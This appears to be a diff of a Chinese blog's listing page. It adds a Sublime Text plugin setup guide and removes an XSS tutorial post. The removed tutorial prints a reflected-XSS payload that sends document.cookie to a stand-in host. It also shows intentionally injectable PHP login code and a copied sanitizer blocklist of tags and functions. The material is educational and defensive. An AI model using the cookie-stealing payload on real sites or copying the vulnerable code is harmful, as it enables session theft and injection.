@@ -82,6 +82,84 @@
       
   <header class="page-header">
     
+      <h1 class="entry-title"><a href="/blog/2015/07/14/other002/">Sublime配置全攻略</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-07-14T13:59:46+08:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:59 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3>一.常用插件</h3>
+
+<p><strong>1.package control</strong>。我们用sublime几乎都会首先安装这个插件，再安装其他插件就方便了。安装方法：</p>
+
+<pre><code>点击sublime的菜单栏 view-&gt;show console;现在打开了控制台
+
+import urllib2,os;pf='Package Control.sublime-package';ipp=sublime.installed_packages_path();os.makedirs(ipp) if not os.path.exists(ipp) else None;open(os.path.join(ipp,pf),'wb').write(urllib2.urlopen('http://sublime.wbond.net/'+pf.replace(' ','%20')).read())
+</code></pre>
+
+<p>然后我们按住 ctrl+shift+p。此时会输出一个输入框，输入install。选择package contrl:install package 回车，需要稍等一会，右下角状态栏会显示正在连接的提示文字。 使用sublime时注意看右下角状态栏，很多插件的提示信息都显示在这里，这个状态栏很小，初次使用的人都有可能没有注意到它。</p>
+
+<p>如果要卸载插件， ctrl+shift+p 输入 remove， 选择package control:remove package 然后再选择已安装的插件， 回车即可卸载。</p>
+
+<p>如果package control 安装插件时失败了， 我们可以采用手动安装的方式， 在google上去搜索插件， 下载插件的源代码。在sublime的菜单栏点击 preferences->Browse package..  此时会打开插件目录。然后把你下载的插件源代码复制进去就可以了。</p>
+
+<p>ctrl+shift+p 打开的输入框面板是什么？任何操作都可以在这个面板里面完成。 打开万能面板有几种方式：</p>
+
+<p>ctrl+shift+p 打开时，我们需要在面板中输入一个命令，然后执行命令。所有菜单栏能操作事都可以在这里输入命令进行操作。</p>
+
+<p>ctrl+p 打开时，能快速查找文件。</p>
+
+<p>ctrl+r 打开时， 能查找当前文件中的函数。</p>
+
+<p>ctrl+g 打开时，能跳转到指定行。</p>
+
+<p><strong>2.ctags。</strong> 这个cake能跨文件跳转，跳转到指定函数声明的地方。使用 <strong>package control</strong>搜索<strong>ctags</strong>进行安装。注意安装好插件后需要安装ctags命令。window下载(ctags.ext <a href="http://pan.baidu.com/s/1sjDmnLV">http://pan.baidu.com/s/1sjDmnLV</a>)。将ctags.ext文件放在一个环境变量能访问到的地方。打开cmd，输入ctags,如果有这个命令，证明成功了。</p>
+
+<p><strong>3.sublimecodeintel代码提示。</strong> sublime默认的代码提示只能提示系统函数，用户自己创建的函数、类不能提示。如果想要提示自己简历的函数。可以安装sublimecondeintel插件</p>
+
+<p>sublimecodeintel安装后需要安配置文件：插件目录./codeintel/config中增加</p>
+
+<pre><code>"php":{
+    "php": 'D:\SaeServer\php\php.ext',
+    "phpExtraPaths": ['D:\SaeServer\php\stdlib'],
+    "phpConfigFile": 'D:\SaeServer\apache\php.ini'
+},
+</code></pre>
+
+<p><strong>4.语法提示。</strong>我们需要在写代码的时候如果有语法错误，能立即提示我们， 可以安装这两个插件：sublimelint 和Phpcs ， sublimeint 需要系统有php命令。 所以需要设置好php的环境变量。 sublimelint的语法错误提示是显示在状态栏上面的，所以在编写程序的时候注意时常看看状态栏。 而Phpcs的语法错误提示是在我们保存文件时弹出万能面板显示错误，sublimelint的错误提示实时但不明显。 Phpcs的错误提示不是实时的，但很明显。 因此我们一般这两个插件都要安装。  Phpcs除了代码提示的共，还有其他功能，但是我暂时没有弄明白其他功能怎么用， 大家可以去研究一下，如果知道怎么用了再告诉我一下。</p>
+
+<p><strong>5.goto document.</strong>这个插件能帮助我们快速查看手册。比如我们在写php代码时，突然忘记了某个函数怎么用了，将鼠标房子这个函数上，然后按F1，他能快速打开PHP手册中的说明这个函数用法的地方。</p>
+
+<p>安装好goto document插件后我们再配置快捷键F1跳转到文档。打开sublime的菜单栏Preferences->key bindings -User 设置快捷键：</p>
+
+<pre><code>[
+    {"keys":["f1"],"command": "goto_documentation"}
+]
+</code></pre>
+
+<p><strong>6.SVN插件.</strong> windows下可以安装Tortoise和Tortoisesvn的客户端。然后在sublime中在目录或文件右键都可以提交svn了。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header class="page-header">
+    
       <h1 class="entry-title"><a href="/blog/2015/07/10/apache002/">Apache基本配置</a></h1>
     
     
@@ -1111,336 +1189,6 @@
 
     </article>
   
-  
-    <article>
-      
-  <header class="page-header">
-    
-      <h1 class="entry-title"><a href="/blog/2015/06/25/php003/">Xss攻击</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-06-25T13:25:55+08:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:25 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h2>什么是xss</h2>
-
-<p>xss 表示cross site scripting（跨站脚本攻击）
-一般分为两中类型
-1：非持久型攻击
-2：持久型攻击</p>
-
-<h3>例如:</h3>
-
-<figure class='code'><figcaption><span>非持久型 </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>非持久型攻击是一次性的，仅对当前的页面访问产生影响
-</span><span class='line'>$name = $_GET['name'];
-</span><span class='line'>echo "welcome $name";
-</span><span class='line'>echo "&lt;a href='http://www.baidu.com'>click to down&lt;/a>";
-</span><span class='line'>攻击者可以通过下面url链接
-</span><span class='line'>index.php?name=guest&lt;script>alert('test')&lt;/script>
-</span><span class='line'>index.php?name=guest&lt;script>new Image().src="http://mytest.com/?"+document.cookie&lt;/script></span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><figcaption><span>持久型 </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随者攻击数据一直存在
-</span><span class='line'>$host = '192.168.1.8';
-</span><span class='line'>$dbname = 'app';
-</span><span class='line'>$user = 'yyy';
-</span><span class='line'>$password = 'xxx';
-</span><span class='line'>$schema = 'test';
-</span><span class='line'>$conection_string = "host=$host dbname=$dbname user=$user password=$password";
-</span><span class='line'>$connect = pg_connect($conection_string,$PGSQL_CONNECT_NEW);
-</span><span class='line'>if(!Connect){
-</span><span class='line'>  echo 'database connection failure';
-</span><span class='line'>  exit;
-</span><span class='line'>}
-</span><span class='line'>$query = "select user_name,password from $schema.members where user_name'".$_POST['user_name']."'";
-</span><span class='line'>$result = pg_query($connect,$query);
-</span><span class='line'>$row = pg_fetch_array($result,NULL,PGSOL_ASSOC);
-</span><span class='line'>$user_pass = md5($_POST['pass_word']);
-</span><span class='line'>$user_name = $row['user_name'];
-</span><span class='line'>if(strcmp($user_pass,$row['password']!=0)){
-</span><span class='line'>  echo "Login failed";
-</span><span class='line'>}else{
-</span><span class='line'>  session_start();
-</span><span class='line'>  $_SESSION['USER_NAME'] = $user_name;
-</span><span class='line'>  echo "&lt;head>&lt;meta http-equiv=\"Refresh\" content=\"0;url=home.php\">&lt;/head>";
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>预防措施</h2>
-
-<figure class='code'><figcaption><span>cookie </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>如保存用户登录状态的cookie，设置httponly，php的setcookie函数最后一个参数即可设置
-</span><span class='line'>setcookie(name,value,expire,path,domain,secure)
-</span><span class='line'>name:cookie的名称 
-</span><span class='line'>value：cookie的值
-</span><span class='line'>expire：cookie的有效期
-</span><span class='line'>path：cookie的服务器路径
-</span><span class='line'>domain：cookie的域名
-</span><span class='line'>secure：规定是否通过安全的https链接来传输cookie</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><figcaption><span>输入检查 </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>不要让用户写入任何script和发起恶意http请求的东西
-</span><span class='line'>htmlspecialchars处理</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>防止xss攻击（不是我写的）</h2>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-<span class='line-number'>87</span>
-<span class='line-number'>88</span>
-<span class='line-number'>89</span>
-<span class='line-number'>90</span>
-<span class='line-number'>91</span>
-<span class='line-number'>92</span>
-<span class='line-number'>93</span>
-<span class='line-number'>94</span>
-<span class='line-number'>95</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>function xss_clean($str, $is_image = FALSE)
-</span><span class='line'>{
-</span><span class='line'>  if (is_array($str))
-</span><span class='line'>  {
-</span><span class='line'>      while (list($key) = each($str))
-</span><span class='line'>      {
-</span><span class='line'>          $str[$key] = $this->xss_clean($str[$key]);
-</span><span class='line'>      }
-</span><span class='line'>
-</span><span class='line'>      return $str;
-</span><span class='line'>  }
-</span><span class='line'>
-</span><span class='line'>  $str = remove_invisible_characters($str);
-</span><span class='line'>
-</span><span class='line'>  $str = $this->_validate_entities($str);
-</span><span class='line'>
-</span><span class='line'>  $str = rawurldecode($str);
-</span><span class='line'>
-</span><span class='line'>  $str = preg_replace_callback("/[a-z]+=([\'\"]).*?\\1/si", array($this, '_convert_attribute'), $str);
-</span><span class='line'>
-</span><span class='line'>  $str = preg_replace_callback("/&lt;\w+.*?(?=>|&lt;|$)/si", array($this, '_decode_entity'), $str);
-</span><span class='line'>
-</span><span class='line'>  $str = remove_invisible_characters($str);
-</span><span class='line'>  if (strpos($str, "\t") !== FALSE)
-</span><span class='line'>  {
-</span><span class='line'>      $str = str_replace("\t", ' ', $str);
-</span><span class='line'>  }
-</span><span class='line'>
-</span><span class='line'>  $converted_string = $str;
-</span><span class='line'>
-</span><span class='line'>  $str = $this->_do_never_allowed($str);
-</span><span class='line'>
-</span><span class='line'>  if ($is_image === TRUE)
-</span><span class='line'>  {
-</span><span class='line'>      $str = preg_replace('/&lt;\?(php)/i', "&lt;?\\1", $str);
-</span><span class='line'>  }
-</span><span class='line'>  else
-</span><span class='line'>  {
-</span><span class='line'>      $str = str_replace(array('&lt;?', '?'.'>'),  array('&lt;?', '?&gt;'), $str);
-</span><span class='line'>  }
-</span><span class='line'>
-</span><span class='line'>  $words = array(
-</span><span class='line'>      'javascript', 'expression', 'vbscript', 'script', 'base64',
-</span><span class='line'>      'applet', 'alert', 'document', 'write', 'cookie', 'window'
-</span><span class='line'>  );
-</span><span class='line'>
-</span><span class='line'>  foreach ($words as $word)
-</span><span class='line'>  {
-</span><span class='line'>      $temp = '';
-</span><span class='line'>
-</span><span class='line'>      for ($i = 0, $wordlen = strlen($word); $i &lt; $wordlen; $i++)
-</span><span class='line'>      {
-</span><span class='line'>          $temp .= substr($word, $i, 1)."\s*";
-</span><span class='line'>      }
-</span><span class='line'>
-</span><span class='line'>      $str = preg_replace_callback('#('.substr($temp, 0, -3).')(\W)#is', array($this, '_compact_exploded_words'), $str);
-</span><span class='line'>  }
-</span><span class='line'>
-</span><span class='line'>  do
-</span><span class='line'>  {
-</span><span class='line'>      $original = $str;
-</span><span class='line'>
-</span><span class='line'>      if (preg_match("/&lt;a/i", $str))
-</span><span class='line'>      {
-</span><span class='line'>          $str = preg_replace_callback("#&lt;a\s+([^>]*?)(>|$)#si", array($this, '_js_link_removal'), $str);
-</span><span class='line'>      }
-</span><span class='line'>
-</span><span class='line'>      if (preg_match("/&lt;img/i", $str))
-</span><span class='line'>      {
-</span><span class='line'>          $str = preg_replace_callback("#&lt;img\s+([^>]*?)(\s?/?>|$)#si", array($this, '_js_img_removal'), $str);
-</span><span class='line'>      }
-</span><span class='line'>
-</span><span class='line'>      if (preg_match("/script/i", $str) OR preg_match("/xss/i", $str))
-</span><span class='line'>      {
-</span><span class='line'>          $str = preg_replace("#&lt;(/*)(script|xss)(.*?)\>#si", '[removed]', $str);
-</span><span class='line'>      }
-</span><span class='line'>  }
-</span><span class='line'>  while($original != $str);
-</span><span class='line'>
-</span><span class='line'>  unset($original);
-</span><span class='line'>  $str = $this->_remove_evil_attributes($str, $is_image);
-</span><span class='line'>  $naughty = 'alert|applet|audio|basefont|base|behavior|bgsound|blink|body|embed|expression|form|frameset|frame|head|html|ilayer|iframe|input|isindex|layer|link|meta|object|plaintext|style|script|textarea|title|video|xml|xss';
-</span><span class='line'>  $str = preg_replace_callback('#&lt;(/*\s*)('.$naughty.')([^>&lt;]*)([>&lt;]*)#is', array($this, '_sanitize_naughty_html'), $str);
-</span><span class='line'>  $str = preg_replace('#(alert|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si', "\\1\\2&#40;\\3&#41;", $str);
-</span><span class='line'>
-</span><span class='line'>  $str = $this->_do_never_allowed($str);
-</span><span class='line'>
-</span><span class='line'>  if ($is_image === TRUE)
-</span><span class='line'>  {
-</span><span class='line'>      return ($str == $converted_string) ? TRUE: FALSE;
-</span><span class='line'>  }
-</span><span class='line'>
-</span><span class='line'>  log_message('debug', "XSS Filtering completed");
-</span><span class='line'>  return $str;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <ul class="pager">
     
     <li class="previous"><a href="3">&larr; Older</a></li>
@@ -1456,6 +1204,10 @@
     <section class="well">
   <ul id="recent_posts" class="nav nav-list">
     <li class="nav-header">Recent Posts</li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/27/linux003/">linux之ssh</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2015/07/24/websql/">webSql之本地存储</a>
